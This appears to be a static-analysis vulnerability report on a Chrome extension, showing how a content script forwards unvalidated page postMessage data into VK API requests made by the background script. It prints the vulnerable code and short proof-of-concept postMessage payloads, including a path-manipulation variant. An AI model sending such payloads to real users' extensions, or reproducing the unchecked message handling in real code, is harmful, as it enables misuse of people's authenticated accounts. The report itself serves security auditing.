# CoCo Analysis: enakmcmeealkdoeindgoeogldodhdeda

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1 (cs_window_eventListener_message → XMLHttpRequest_url_sink)

---

## Sink: cs_window_eventListener_message → XMLHttpRequest_url_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/enakmcmeealkdoeindgoeogldodhdeda/opgen_generated_files/cs_0.js
Line 467	window.addEventListener("message",function(e){e.source==window&&e.data.type&&"FROM_DXB_WEB"==e.data.type&&chrome.extension.sendMessage({method:e.data.method,query:e.data.query})},!1)
	e.data.method
	e.data.query

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/enakmcmeealkdoeindgoeogldodhdeda/opgen_generated_files/bg.js
Line 965	c.open("GET","https://api.vk.com/method/"+a+"?"+b,!0)
```

**Code:**

```javascript
// Content script (js/init.js) - Entry point
window.addEventListener("message", function(e) {
    if (e.source == window && e.data.type && "FROM_DXB_WEB" == e.data.type) {
        chrome.extension.sendMessage({
            method: e.data.method,  // ← attacker-controlled
            query: e.data.query     // ← attacker-controlled
        });
    }
}, false);

// Background script (js/background.js) - Message handler
function c(a, b) {
    var c = new XMLHttpRequest;
    c.open("GET", "https://api.vk.com/method/" + a + "?" + b, true);  // ← attacker data in URL
    c.onreadystatechange = function() {
        var a;
        if (c.readyState == 4 && 200 <= c.status && 300 > c.status) {
            a = JSON.parse(c.responseText),
            chrome.tabs.getSelected(null, function(b) {
                chrome.tabs.sendMessage(b.id, {response: a})
            })
        }
    },
    c.send()
}

chrome.extension.onMessage.addListener(function(a) {
    c(a.method, a.query);  // Passes attacker data to function c
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from malicious webpage

**Attack:**

```javascript
// Malicious webpage can trigger privileged API calls
window.postMessage({
    type: "FROM_DXB_WEB",
    method: "users.get",  // ← attacker controls VK API method
    query: "user_ids=1"   // ← attacker controls query parameters
}, "*");

// Or manipulate the API endpoint with path traversal/injection:
window.postMessage({
    type: "FROM_DXB_WEB",
    method: "../../../evil",  // ← path manipulation
    query: "attack_payload"
}, "*");
```

**Impact:** Privileged Server-Side Request Forgery (SSRF). The attacker can trigger the extension to make arbitrary XMLHttpRequest calls to https://api.vk.com/method/ with attacker-controlled method names and query parameters. This allows the attacker to abuse the extension's elevated privileges to make authenticated cross-origin requests to the VK API that would normally be blocked by CORS. The extension has cookies permission and webRequest permission, allowing it to send authenticated requests on behalf of the user. The attacker can invoke any VK API method with arbitrary parameters, potentially accessing or modifying the user's VK account data.
